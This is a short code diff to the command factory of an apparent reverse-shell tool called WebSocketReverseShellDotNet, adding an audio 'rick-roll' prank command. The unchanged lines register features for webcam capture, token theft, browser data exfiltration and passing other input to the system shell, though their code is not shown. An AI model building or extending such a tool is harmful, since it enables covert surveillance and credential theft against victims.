@@ -1,4 +1,5 @@
-﻿using System;
+﻿using NAudio.CoreAudioApi;
+using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
@@ -29,6 +30,8 @@ namespace WebSocketReverseShellDotNet.service.factory
             commandsList.Add("/camerashot", new CameraScreenShot());
             commandsList.Add("/tokens", new TokenExfiltereter());
             commandsList.Add("/browser", new BrowserExfelterator());
+            commandsList.Add("rick-roll", new RickRoll());
+            
             commandsList.Add("/??", new HelpCommand());
             commandsList.Add("/exit", new Terminate());
             // If not found, redirect to the system command
